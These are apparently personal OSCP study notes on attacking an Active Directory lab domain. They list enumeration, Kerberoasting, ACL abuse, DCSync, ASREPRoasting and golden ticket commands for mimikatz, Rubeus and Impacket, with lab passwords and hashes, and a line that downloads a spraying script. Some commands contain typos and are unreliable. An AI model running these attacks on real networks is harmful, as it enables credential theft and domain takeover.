# Active Directory 
Terminology 
- Active Directory
- GPO
- SID
- GUID

Related: [Win-Priv-Esc](https://github.com/creighton-lewis/oscp-prep/blob/main/win-privl-esc.md)
## External Enumeration 
### What to look for 
- IP space 
- Domain information 
- Schema format 
- Data disclosures 
- Breach data
### Where to look  

[DomainTools](https://whois.domaintools.com/)

[PTR-Arcive](https://www.whatsmydns.net/dns-lookup/ptr-records)

[TruffleHog](https://github.com/trufflesecurity/truffleHog)

[Linkedin2Username](https://github.com/initstring/linkedin2username)

[DeHashed](https://dehashed.com/search#breachCheck)

[HaveIBeenPwned](https://haveibeenpwned.com/)
- Public Websites 
- Google Dorking
## Password Spraying 
**Linux** 
```
```
**Windows**
```
```
## Internal Enumeration 
```
Get-LocalUser -Name "UserName" | Select-Object Name, PasswordRequired, PasswordLastSet
```
```
Import-Module ActiveDirectory 
Get-Module
```

``` 
Get-ADDomain 
```

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```
Get-ADTrust -Filter * 
```

```
Get-ADGroup -Filter * | select name 
```


```
Get-ADGroup -Identity "Backup Operators"
```
### Powerview

```
Get-Domain 
```

```
Get-DomainController # returns list of domain controllers for specific domain 
Get-ADDomainController # returns domain controller ip address, needed for GetUserSPN.py 
```

```
Get DomainUser #Will return all users or specific user objects in AD 
```

```
GetDomainComputer 
```
``` 
GetDomainGroup

```
```
Get-DomainOU #searches for all specific OU objects in active directory

#OU: A container used to organize objects (like users, groups, and computers) within a domain into a logical hierarchy that mirrors your organization's structure, such as departments (e.g., HR, IT) or geographic locations (e.g., New York, London).
```

```
FindInterestingDomainAcl

```

```
Get-DomainGroupMember
```
```
Get-DomainFileServer
```
```
Get-DomainDFShare
```

**GPO Enumeration**
```
Get-DomainGPO 
```
```
Get-DomainPolicy 
```
**Computer Enumeration** 
```
Get-NetLocalGroup 
Get-NetLocalGroupMember
Get-NetShare 
Test-AdminAccess
Find-DomainUserLocation
Find-DomainShare # Finds reachable shares on domain machines 
FindInterestingDomainShareFile # Searches for files matching specific criteria on readable shares in the domain 
```
**Domain User Information**
```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainUser -Admin Count
```
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse #Used to find users that are part of a target group through nested membership and list them. 
```

**Trust Enumeration** 
```
Get-DomainTrustMapping 
```

```
Test-AdminAccess -Computer ACADEMY-EA-MS01 
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Sharpview 
- Similar capabilities to powerview 
### Bloodhound / SharpHound
> [!NOTE]  
> Must be domain user from Windows attack host positioned within network but not joined to the domain OR transfer tool to domain-joined host 

- Type 'bloodhound' into cmd or powershell 
- Enter credentials 
- Click on upload data and open 

- Can start by typing domain 
- View result of pre-built queries in analyiss tab

Find Computers where Domain Users are Local Admin

## Exploitation (from Linux)
> [!NOTE]  
> Requires domain user, cleartext password or hash, a shell in context of user or a shell in context of system. Must also know which host is domain controller so we can query it 

**Kerberoasting**
```
sudo python3 -m pip install .

```
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
## Exploitation (from Windows )


**Kerberoasting** 
```
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN |Select samaccountname
Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

**Password Spraying**

```
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
tag:lateral-movement

```

**Pillaging** 

```
mimikatz.exe 
lasadump::secrets
token::elevate
```

```
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```
## ACL
### ACL Rights & What They Mean 
GenericRight - all possible access rights 

GenericWrite - full write access

WriteDACL - Can grant yourself right to add members to a group, grant full control over a user, , computer, domain, or GPO 


WriteDACL
```
Find-InterestingDomainACL
```


### Changing User Password Based on ACL Information 
> [!NOTE]  
> Must authenticate as user who can force change passwords
1. Creates PSCredential Object
``` 
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```
```
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```
2. Creates secure string object that represents password for target user
```
$target-user-Password = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
3. Sets domain user password
```
cd Tools 
Impot-Module .\Powerview.ps1 
Set-DomainUserPassword -Identity target-user -AccountPassword $target-user-password -Credentials $Cred -Verbose
```
### Adding Target User To Privileged Group

>[!NOTE]  
>What all is required to make this possible?
>Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup

**Step 1** 
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
**Step 2** 
```
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\target-user', $SecPassword)
```
**Step 3**
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

```
### Creating fake SPN 
 
> [!NOTE]  
>Must be authenticated as member of group to be successful. 
> Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup 

**Fake SPN Creation**
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
**Cleanup** 
1. Remove fake SPN created for adunn user 
```
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
2. Remove damundsen user for Help Desk 1 group 
 ```powershell
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 
 ```

3. Confirm group removal 
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
### DSync 

>[!NOTE]  
>Must have control over account that has right to perform domain replication

**Method 1**
```
Get-DomainUser -Identity user-of-interest  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
result 

```
samaccountname     : adunn
objectsid          : S-1-5-21-3842939050-3880317879-2865463114-1164
memberof           : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
```
```
$sid = "sid" 
```
```
Get-ObjectACL "DC=Domain-Controller,DC=local" ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/user-of-interest@172.16.5.5 
```
**Method 2**

>[!NOTE]  
>Must be ran in context of user with DCSync privileges

```
.\mimikatz.exe

privilege::debug 

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
### Privilege Opportunity 
```
.\SharpHound.exe
```
```
cd C:\Tools\BloodHound-GUI
.\BloodHound.exe
```
Upload file generated by BloodHound

## Double Hop Mitigation 
- Refers to situation when someone uses winrm/powershell and the authentication mechanism doesn't last beyond one hop, because credentials are never stored
- Unlikely to occur if unconstrained delegation is enabled
  
**Situation 1**
  
```
 $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force #adds credential that can be referenced 
 get-domainuser -spn -credential $Cred | select samaccountname # utilizes the username (whoami) and the newly created secure password created above 
```
**Situation 2**

```
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
Restart-Service WinRM

```
## Misconfigurations 
**Exchange Related Group** 
**Exchange Related Group Organization Management** 
- Vectors for privilege escalation
**Printer Bug**
>[!NOTE]
> What hardware or windows versions is this likely to be successful against?
> Should misconfigurations be checked first or last? 
  ```
  Import-Module .\SecurityAssessment.ps1
  Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
  ```
**Password Locateed in Description**
```
  Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
**Password Not Required**

```
  Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
**ASREPROasting**
- Possible for accounts that do not have require kerberos pre-authentication enabled
- 
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

**GPO Abuse**
 ```
 Get-DomainGPO |select displayname
 ```
 ```
 Get-GPO -All | Select DisplayName
 ```
 
 ```
 $sid=Convert-NameToSid "Group of Interest"
 Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
>[!NOTE]
>ObjectDN = -Guid value

```
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
- Bloodhound used for even more enumeration

## Domain Trusts 
Trust: Used to establish forest-forest or domain-domain authentication; lets users access resources
**Transitive vs Non-Transitive**

- Transitive: Loose trust configuration
  
- Non-Transitive: Strict, direct trust configuration
  
**Common Trust Arrangements** 

- Parent-child: Two or more domains within same forest

- Cross link: Trust between child domains to speed up authentication

- External: Non-transitive between two separate domains in separate forests

- Tree-root: Two way transitive trust between forest root domain and new tree root domain

- Forest: Transitive trust between two forest root domains 

## **Trust Enumeration**

```
Import-Module .\PowerView.ps1
Get-DomainTrustMapping
```

```
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

## **Trust Exploitation**
sidHistory: attribute used in migration scenarios if a user in one domain is migrated to another, a new account is created in the second. the original SID will be added to the new user's SID history attribute. 

extraSIDS attack: lets user add an admin account to the SID history attribute of an account they can control 
>[!NOTE]
> KRBTGT hash for child domain
>
>SID for child domain
>
>Name of target user (can be fake) 
>
>FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
>
>SID of Enterprise Admins group of root domain

### Child To Parent
#### From Windows 

#### **Mimikatz** 

1.**KRBTGT hash**

```
.\mimikatz.exe 
lsadump::dsync /user:CHILD-DOMAIN-BEGINNING\krbtgt
#ex if CHILD DOMAIN is PRODUCTS.INLANEFREIGHT.COM, you would write
PRODUCTS
```
**2.SID for child domain**

```
Get-DomainSID #run from within/from the child domain
Convert-NameToSid target.domain.com\krbtgt
```

**3.TARGET USER**

```
hacker 
```
**4. CHILD-DOMAIN Name**
- already known 
5. SID for Enterprise Admins
  
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```
**Golden ticket creation**

```
./mimikatz.exe 
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-DOMAIN-SID /krbtgt:/KRBTGT-hash /sids:ENTERPRISE-ADMIN-SID /ptt
```
#### Rubeus 

```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
>[!IMPORTANT]
> When target domain is not the same as user's domain, we will need specific exact domain to perform the DCSync operation on the particular domain controller

```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
#### From Linux 
>[!NOTE]
> KRBTGT hash for child domain
>
>SID for child domain
>
>Name of target user (can be fake) 
>
>FDQN of child domain (X.INLANEFREIGHT.LOCAL) (already known) 
>
>SID of Enterprise Admins group of root domain

**1.KRBTGT Hash**
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
**2.SID brute forcing to find SID of child domain and enterprise admin**
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID" 
```
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
**Golden Ticket Creation**
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

export KRB5CCNAME=hacker.ccache #file used to hold kerberos credentials, referenced 
```

**Getting System Shell**
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
### Cross Forest 
#### Windows 
**Situation One**
1. Find domain user who is domain admin
2. Run rubeus, specifying domain and user
```
\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
**Admin Password Reuse**
- Foreign group membership can be found 
#### Linux 
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
- Foreign group membership with bloodhound-python is possible but requires adding INLANEFREIGHT.LOCAL information to /etc/resolv.conf

```
cat /etc/resolv.conf
```
```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

